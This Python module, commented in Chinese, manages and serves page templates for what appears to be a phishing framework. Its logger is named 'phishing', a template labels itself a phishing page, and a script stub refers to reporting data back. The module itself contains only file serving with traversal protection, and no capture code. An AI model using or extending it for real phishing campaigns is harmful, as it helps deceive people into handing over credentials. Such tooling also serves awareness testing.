"""静态页面模块 — pages/ 目录管理 + 页面渲染。

页面模块格式(每页面一个文件夹):
    pages/<name>/
      index.html        # 必须;支持 {{host}}/{{port}}/{{active_page}} 占位符
      style.css         # 可选
      app.js            # 可选
      meta.json         # 可选: {"desc": "...", "author": "..."}

访问方式:
    /                    → 当前活动页面(config.active_page,不存在回退第一个可用)
    /page/<name>         → 指定页面 index.html
    /pages/<name>/<file> → 页面内静态资源(防路径穿越 + 扩展名白名单)
"""

import json
import logging
import mimetypes
import os
import re
from typing import Dict, List, Optional

logger = logging.getLogger("phishing.page_renderer")

# 静态资源白名单(其余一律拒绝)
_ALLOWED_EXTS = {".html", ".css", ".js", ".png", ".jpg", ".jpeg", ".gif",
                 ".svg", ".ico", ".woff", ".woff2", ".ttf", ".eot", ".webp", ".txt", ".json"}

_PLACEHOLDER_RE = re.compile(r"\{\{\s*([^{}]+?)\s*\}\}")

# 占位符替换表:{{host}}/{{port}}/{{active_page}}/{{config.xxx}}
def _render_page(template: str, config) -> str:
    if not template:
        return ""

    def replace(match: re.Match) -> str:
        expr = match.group(1).strip()
        if expr == "host":
            return str(config.host)
        if expr == "port":
            return str(config.port)
        if expr == "active_page":
            return str(config.active_page)
        if expr.startswith("config."):
            key = expr[len("config."):]
            return str(getattr(config, key, ""))
        return ""

    return _PLACEHOLDER_RE.sub(replace, template)


class PageRenderer:
    """页面模块管理:列表 / 渲染 / 静态资源(防穿越)。"""

    def __init__(self, pages_dir: str = "pages"):
        self._pages_dir = pages_dir

    # ── 公开接口 ──

    def list_pages(self) -> list:
        """列出页面模块: [{name, desc, files}]。"""
        if not os.path.isdir(self._pages_dir):
            return []
        out = []
        for entry in sorted(os.listdir(self._pages_dir)):
            d = os.path.join(self._pages_dir, entry)
            if not os.path.isdir(d) or entry.startswith("."):
                continue
            desc = self._read_desc(d, entry)
            files = sorted(f for f in os.listdir(d)
                           if os.path.isfile(os.path.join(d, f)) and not f.startswith("."))
            out.append({"name": entry, "desc": desc, "files": files})
        return out

    def page_exists(self, name: str) -> bool:
        if not name:
            return False
        index = os.path.join(self._pages_dir, name, "index.html")
        return os.path.isfile(index)

    def active_page(self, config) -> str:
        """当前活动页面名;配置的 active_page 不存在时回退第一个可用,再没有返回 ""。"""
        name = str(getattr(config, "active_page", "") or "")
        if self.page_exists(name):
            return name
        pages = self.list_pages()
        if pages:
            return pages[0]["name"]
        return ""

    def render_index(self, name: str, config) -> Optional[Dict[str, str]]:
        """渲染指定页面 index.html(占位符替换)。返回 {html, mime} 或 None。"""
        index = os.path.join(self._pages_dir, name, "index.html")
        if not os.path.isfile(index):
            return None
        try:
            with open(index, "r", encoding="utf-8") as f:
                content = f.read()
        except OSError as e:
            logger.warning("page %s: index read failed: %s", name, e)
            return None
        return {"html": _render_page(content, config),
                "mime": "text/html; charset=utf-8"}

    def serve_file(self, name: str, file: str, config) -> Optional[Dict[str, bytes]]:
        """提供页面内静态资源。路径穿越/白名单防护。返回 {data, mime} 或 None。"""
        page_dir = os.path.normpath(os.path.join(self._pages_dir, name))
        if not page_dir.startswith(os.path.normpath(self._pages_dir) + os.sep):
            return None
        path = os.path.normpath(os.path.join(page_dir, file))
        # 穿越防护:规范化后必须仍在页面目录内
        if path == page_dir or not path.startswith(page_dir + os.sep):
            logger.warning("page %s: path traversal blocked: %r", name, file)
            return None
        ext = os.path.splitext(path)[1].lower()
        if ext not in _ALLOWED_EXTS:
            return None
        if not os.path.isfile(path):
            return None
        try:
            with open(path, "rb") as f:
                data = f.read()
        except OSError as e:
            logger.warning("page %s: file read failed %s: %s", name, file, e)
            return None
        mime = mimetypes.guess_type(path)[0] or "application/octet-stream"
        if mime.startswith("text/") or mime in ("application/javascript",
                                                "application/json"):
            mime += "; charset=utf-8"
        return {"data": data, "mime": mime}

    def list_page_files(self, name: str) -> list:
        """页面内文件清单(面板浏览/编辑用)。"""
        d = os.path.join(self._pages_dir, name)
        if not os.path.isdir(d):
            return []
        return sorted(f for f in os.listdir(d)
                      if os.path.isfile(os.path.join(d, f)) and not f.startswith("."))

    def read_page_file(self, name: str, file: str) -> Optional[str]:
        """读取页面内文本文件(白名单扩展名内)。不存在/越权返回 None。"""
        res = self.serve_file(name, file, None)
        if not res or not isinstance(res.get("data"), bytes):
            return None
        try:
            return res["data"].decode("utf-8", errors="replace")
        except Exception:
            return None

    def write_page_file(self, name: str, file: str, content: str) -> tuple:
        """写入页面内文件(html/css/js/txt/json 白名单,防穿越)。返回 (ok, message)。"""
        if not name or not file:
            return False, "页面名/文件名不能为空"
        if ".." in file.split("/") or file.startswith("/") or "\\" in file:
            return False, "文件名非法"
        page_dir = os.path.normpath(os.path.join(self._pages_dir, name))
        if not page_dir.startswith(os.path.normpath(self._pages_dir) + os.sep):
            return False, "页面名非法"
        ext = os.path.splitext(file)[1].lower()
        if ext not in _ALLOWED_EXTS:
            return False, f"只允许写入: {sorted(_ALLOWED_EXTS)}"
        if not os.path.isdir(page_dir):
            return False, f"页面 {name} 不存在"
        path = os.path.normpath(os.path.join(page_dir, file))
        if not path.startswith(page_dir + os.sep):
            return False, "文件名非法"
        try:
            with open(path, "w", encoding="utf-8") as f:
                f.write(content)
        except OSError as e:
            return False, f"写入失败: {e}"
        return True, f"已写入 {name}/{file}"

    def create_page(self, name: str, desc: str = "") -> tuple:
        """新建页面文件夹(index.html + meta.json 骨架)。返回 (ok, message)。"""
        if not name or not re.match(r"^[A-Za-z0-9_-]+$", name):
            return False, "页面名只允许字母/数字/下划线/短横线"
        d = os.path.join(self._pages_dir, name)
        if os.path.exists(d):
            return False, f"页面 {name} 已存在"
        try:
            os.makedirs(d)
            with open(os.path.join(d, "index.html"), "w", encoding="utf-8") as f:
                f.write("<!DOCTYPE html>\n<html lang=\"zh\">\n<head>\n"
                        "<meta charset=\"utf-8\">\n"
                        "<title>{{active_page}}</title>\n"
                        "<link rel=\"stylesheet\" href=\"/pages/{{active_page}}/style.css\">\n"
                        "</head>\n<body>\n"
                        "<div class=\"ph-card\"><h1>{{active_page}}</h1>"
                        "<p>新钓鱼页面模板</p></div>\n"
                        "<script src=\"/pages/{{active_page}}/app.js\"></script>\n"
                        "</body>\n</html>\n")
            with open(os.path.join(d, "style.css"), "w", encoding="utf-8") as f:
                f.write("body{font-family:system-ui,sans-serif;background:#0b1020;"
                        "color:#e6edf3;display:flex;align-items:center;justify-content:center;"
                        "min-height:100vh;margin:0}\n.ph-card{background:#111a2e;"
                        "padding:2rem 3rem;border-radius:12px;border:1px solid #2a3a5c}\n")
            with open(os.path.join(d, "app.js"), "w", encoding="utf-8") as f:
                f.write("// {{active_page}} 页面脚本:可在这里调用 report() 回传\n")
            with open(os.path.join(d, "meta.json"), "w", encoding="utf-8") as f:
                json.dump({"desc": desc or name, "author": ""}, f,
                          indent=2, ensure_ascii=False)
        except OSError as e:
            return False, f"创建失败: {e}"
        return True, f"页面 {name} 已创建"

    def delete_page(self, name: str) -> tuple:
        """删除页面文件夹(必须非当前活动页面)。返回 (ok, message)。"""
        d = os.path.join(self._pages_dir, name)
        if not os.path.isdir(d):
            return False, f"页面 {name} 不存在"
        try:
            import shutil
            shutil.rmtree(d)
        except OSError as e:
            return False, f"删除失败: {e}"
        return True, f"页面 {name} 已删除"

    # ── 内部 ──

    def _read_desc(self, page_dir: str, name: str) -> str:
        meta_path = os.path.join(page_dir, "meta.json")
        if os.path.isfile(meta_path):
            try:
                with open(meta_path, "r", encoding="utf-8") as f:
                    meta = json.load(f)
                if isinstance(meta, dict) and meta.get("desc"):
                    return str(meta["desc"])
            except (OSError, json.JSONDecodeError):
                pass
        return name
